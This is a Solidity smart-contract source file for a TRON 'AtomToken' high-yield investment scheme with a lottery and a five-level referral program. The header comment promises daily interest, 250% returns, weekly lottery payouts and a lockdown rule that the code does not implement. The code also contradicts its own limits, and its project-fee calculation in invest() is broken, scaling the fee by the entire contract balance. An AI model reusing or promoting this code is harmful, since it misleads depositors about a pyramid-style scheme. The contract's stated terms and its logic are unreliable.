//SourceUnit: AtomTokenV1.sol

/*
 *   ATOM TOKEN SMART CONTRACT  : An Ocean For Old And Young
 * -----------------------------------------------------------------------------------------------
 * 
 *   NOTE : LOTTERY BALANCE AND INVEST BALANCE ARE NOT SAME
 *   
 *   INVESTMENT CONDITIONS
 *
 *   - Basic interest rate: +3% every 24 hours 
 *   - Personal hold-bonus: +0.2% for every 24 hours without withdraw
 *   - Every Single Wallet Can Deploy Smart Contract Once And After Finishing Income Contract Starts Again With User Request
 *   - Minimal deposit: 50 TRX, Maximal Limit: 100,000 TRX With Reinvest Posibility To Total 100,000 TRX
 *   - Total income: 250% (Lottery Income + Refferal Income + Interest Rate)
 *   - Withdraw any time
 *   - 
 *   - Deposit limits: if user Took Total Income 250% 
 *
 *   LOTTERY CONDITIONS
 *
 *   - Price of Ticket: 50 TRX
 *   - Limit of Total Tickets Can User Buy: Unlimited
 *   - Lottery Program Duration : every 7 days automatically
 *   - 65% divided between 20 of winners in lottery program
 *   - winners program: first 2 users -> 25% | 4 users next -> 15% | 6 users next -> 15% | last 8 users -> 10%
 *   - 10% divided between Refferal users invited in contract
 *   - 10% divided between non-winners (note: they had to buy 1 lottery ticket at least)
 *   - 15% of remained amount will be moved to invest balance
 *
 *   AFFILIATE PROGRAM
 *   - Total Affiliate Program Benefit: 15% Total Commision
 *
 *   - 5-level referral commission: 5% - 4% - 3% - 2% - 1%
 *
 *   CONTRACT LOCKDOWN
 *   - if balance goes to 35% of total deposit users that took more than 170% income Can't withdraw from their income
 *
 *   - 5-level referral commission: 5% - 4% - 3% - 2% - 1%
 *
 *
 */

pragma solidity 0.5.10;

import "SafeMath.sol";

contract AtomToken {
    using SafeMath for uint;

    uint constant public INVEST_MIN_AMOUNT = 5 trx;
    uint constant public BASE_PERCENT = 1000;
    uint[] public REFERRAL_PERCENTS = [500,400,300,200,100]; 
    uint constant public MAX_CONTRACT_PERCENT = 1000;
    uint constant public LOCKDOWN_MAX_INCOME_PERCENT = 1700; //170%
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public LOTTERY_PERCENTS_DIVIDER = 10000;
    uint constant public TIME_STEP = 1 days;
    uint constant public PROJECT_FEE = 200;
    uint constant public LOTTERY_TICKET_AMOUNT = 50 trx;
    uint public totalDeposits;
    uint public totalInvested;
    uint public totalWithdrawn;

    uint public contractPercent;
    uint public contractCreation;
    
    address payable public projectAddress;

    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
        uint32 start;
    }
    
    struct BuyLotteryTicket {
        uint64 amount;
        uint64 withdrawn;
        uint32 start;
    }

    struct User {
        BuyLotteryTicket[] lotterytokens;
        Deposit[] deposits;
        uint32 checkpoint;
        address referrer;
        uint64 bonus;
        uint24[5] refs;
    }

    mapping (address => User) internal users;
    mapping (uint => uint) internal turnover;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event NewTicket(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event FeePayed(address indexed user, uint totalAmount);

    constructor(address payable projectAddr) public {
        require(!isContract(projectAddr));
        projectAddress = projectAddr;
        contractCreation = block.timestamp;
    }

    function lottery () public payable {
      require(!isContract(msg.sender) && msg.sender == tx.origin);

      require(msg.value >= LOTTERY_TICKET_AMOUNT, "Minimum Ticket Price amount 50 TRX");

      User storage user = users[msg.sender];

      uint msgValue = msg.value;
     
        user.lotterytokens.push(BuyLotteryTicket(uint64(msgValue), 0, uint32(block.timestamp)));

        totalInvested = totalInvested.add(msgValue);
        
        totalDeposits++;

        emit NewDeposit(msg.sender, msgValue);
        
        if (user.referrer != address(0)) {

            address upline = user.referrer;
            for (uint i = 0; i < 5; i++) {
                if (upline != address(0)) {
                    uint amount = msgValue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);

    

                    if (amount > 0) {
                        address(uint160(upline)).transfer(amount);
                        users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));

                        emit RefBonus(upline, msg.sender, i, amount);
                    }

                    users[upline].refs[i]++;
                    upline = users[upline].referrer;
                } else break;
            }

        }

        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(uint64(msgValue), 0, uint32(block.timestamp)));

        totalInvested = totalInvested.add(msgValue);
        totalDeposits++;

        emit NewTicket(msg.sender, msgValue);



    }

    function invest() public payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);

        require(msg.value >= INVEST_MIN_AMOUNT, "Minimum deposit amount 5 TRX");

        User storage user = users[msg.sender];

        uint msgValue = msg.value;
        
        uint projectFee = msgValue.mul(address(this).balance).div(PERCENTS_DIVIDER);
        
        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(uint64(msgValue), 0, uint32(block.timestamp)));

        totalInvested = totalInvested.add(msgValue);
        totalDeposits++;

        emit NewDeposit(msg.sender, msgValue);
        projectAddress.transfer(projectFee);
    }
    
    function withdraw() public {

        User storage user = users[msg.sender];
        uint userPercentRate = getUserPercentRate(msg.sender);
        uint totalAmount;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends));
                totalAmount = totalAmount.add(dividends);

            }
        }

        require(totalAmount > 0, "User has no dividends");

        uint contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }

        user.checkpoint = uint32(block.timestamp);

        msg.sender.transfer(totalAmount);

        totalWithdrawn = totalWithdrawn.add(totalAmount);

        emit Withdrawn(msg.sender, totalAmount);
        
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getUserPercentRate(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        if (isActive(userAddress)) {
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP.div(2)).mul(5);
            return contractPercent.add(timeMultiplier);
        } else {
            return contractPercent;
        }
    }

    function getUserAvailable(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint userPercentRate = getUserPercentRate(userAddress);

        uint totalDividends;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }

                totalDividends = totalDividends.add(dividends);

            }

        }

        return totalDividends;
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

        return (user.deposits.length > 0) && uint(user.deposits[user.deposits.length-1].withdrawn) < uint(user.deposits[user.deposits.length-1].amount).mul(2);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount = user.bonus;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn));
        }

        return amount;
    }
  
    function getUserDeposits(address userAddress, uint last, uint first) public view returns (uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddress];

        uint count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint[] memory amount = new uint[](count);
        uint[] memory withdrawn = new uint[](count);
        uint[] memory start = new uint[](count);

        uint index = 0;
        for (uint i = first; i > last; i--) {
            amount[index] = uint(user.deposits[i-1].amount);
            withdrawn[index] = uint(user.deposits[i-1].withdrawn);
            start[index] = uint(user.deposits[i-1].start);
            index++;
        }

        return (amount, withdrawn,start);
    }

    function getSiteStats() public view returns (uint, uint, uint, uint) {
        return (totalInvested, totalDeposits, address(this).balance, contractPercent);
    }

    function getUserStats(address userAddress) public view returns (uint, uint, uint, uint, uint) {
        uint userPerc = getUserPercentRate(userAddress);
        uint userAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userDeposits = getUserAmountOfDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);

        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

//SourceUnit: SafeMath.sol

pragma solidity 0.5.10;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}